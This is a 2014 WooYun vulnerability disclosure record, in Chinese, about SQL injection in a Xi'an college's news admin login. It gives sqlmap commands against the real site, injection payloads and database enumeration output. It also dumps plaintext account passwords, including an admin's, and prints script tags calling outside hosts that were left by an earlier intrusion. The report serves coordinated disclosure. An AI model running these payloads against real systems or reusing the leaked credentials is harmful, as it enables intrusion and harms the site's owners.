{"id": 51936, "wybug_id": "wooyun-2014-072903", "wybug_title": "西安某学院新闻管理后台SQL注入漏洞&amp;后台可登陆&amp;疑似已被入侵", "wybug_corp": "西安航空学院", "wybug_author": "汪小弟", "wybug_date": "2014-08-18 19:01", "wybug_open_date": "2014-10-02 19:04", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["管理后台对外", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-02：\t细节向公众公开  简要描述： RT 详细说明：  1、可成功登录后台，并修改新闻内容\n\n2、查看数据库内容，发现疑似入侵痕迹\n\n   漏洞证明：  1、找到管理员后台http://www.xihangzh.com/manager/Default.asp2、尝试自动注入测试，使用--data参数提交post数据\nsqlmap.py -u \"http://www.xihangzh.com/manager/Default.asp\" --data=\"username=12&pass=12\"\n结果如下，username、password（测试过程忽略了对password参数的测试）可注入，可获取到数据库信息、系统信息、IIS信息等等。\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: username    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: username=12' AND 6473=CONVERT(INT,(SELECT CHAR(113)+CHAR(103)+CHAR(101)+CHAR(119)+CHAR(113)+(SELECT (CASE WHEN (6473=6473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(113)+CHAR(113))) AND 'rUIB'='rUIB&Userpass=12    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: username=12'; WAITFOR DELAY '0:0:5'--&Userpass=12    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: username=12' WAITFOR DELAY '0:0:5'--&Userpass=12---[16:07:31] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000[16:07:31] [INFO] fetched data logged to text files under '\\.sqlmap\\output\\www.xihangzh.com'\n3、进一步获取数据库、表信息等等\nsqlmap.py -u \"http://www.xihangzh.com/manager/Default.asp\" --data=\"username=12&pass=12\" --current-db --current-user\n获取到db和user信息\ncurrent user:    'xhnews'[16:13:19] [INFO] fetching current database[16:13:19] [INFO] resumed: xhnewscurrent database:    'xhnews'\n获取当前数据库中的表信息：\nsqlmap.py -u \"http://www.xihangzh.com/manager/Default.asp\" --data=\"username=12&pass=12\" -D \"xhnews\" --tables\n\nDatabase: xhnews[18 tables]+----------------------------+| VideoNews                  || dtproperties               || gonggao                    || itemnews                   || jishu                      || news                       || newsuser                   || sysconstraints             || syssegments                || xhnews.D99_CMD             || xhnews.D99_Tmp             || xhnews.jiaozhu             || xhnews.kill_kk             || xhnews.pangolin_test_table || xhnews.sysfile1            || xhnews.systree             || xhnews.t_jiaozhu           || xhnews.xl                  |+----------------------------+\n4、dump表内容，\nsqlmap.py -u \"http://www.xihangzh.com/manager/Default.asp\" --data=\"username=12&pass=12\" -D \"xhnews\" -T \"newsuser\" --dump\n获取到用户名和账号信息，密码明文保存，无须破解。同时看看userright试试admin权限账号登陆后台http://www.xihangzh.com/manager/Default.asp\nDatabase: xhnewsTable: newsuser[5 entries]+--------+----------------------+----------------------+----------------------+| UserID | UserName             | UserPass             | UserRight            |+--------+----------------------+----------------------+----------------------+| 10     | ckj                  | ckj                  | user                 || 11     | gckj                 | gckj                 | user                 || 4      | wl                   | 92832523             | admin                || 8      | rgkj                 | rgkj                 | user                 || 9      | dpjkj                | dpjkj                | user                 |+--------+----------------------+----------------------+----------------------+\n5、看以下几个表的名字\n| xhnews.D99_CMD             || xhnews.D99_Tmp             || xhnews.jiaozhu             || xhnews.kill_kk             || xhnews.pangolin_test_table || xhnews.sysfile1            || xhnews.systree             || xhnews.t_jiaozhu           || xhnews.xl                  |\n有些已被入侵的怀疑，尤其是这个pangolin明显是至少已经有人测试过的痕迹，选一个表看一下“xhnews.jiaozhu ”\nTable: xhnews.jiaozhu[16 entries]+-------------------------------------------------------------------------------------+-------------------------------------------------------------------------------------+-------------------------------------------------------------------------------------+| DirAtt      | DirName            | DirFile                  |+-------------------------------------------------------------------------------------+-------------------------------------------------------------------------------------+-------------------------------------------------------------------------------------+| 1<script src=http://3b3.org/c.</title>\"><script src=http://a.ll8cc.cn></script><!-- | ahcmd<script src=http://3b3.or</title>\"><script src=http://a.ll8cc.cn></script><!-- | 1<script src=http://3b3.org/c.</title>\"><script src=http://a.ll8cc.cn></script><!-- |\n   修复方案：  1、后台不要对外2、从IIS版本看也比较低，也需要关注系统及平台的安全设置3、需要sql注入的防护4、密码加密存储，禁止弱口令   版权声明：转载请注明来源 汪小弟@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2014-08-22 08:19 厂商回复： 通知用户处理中 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}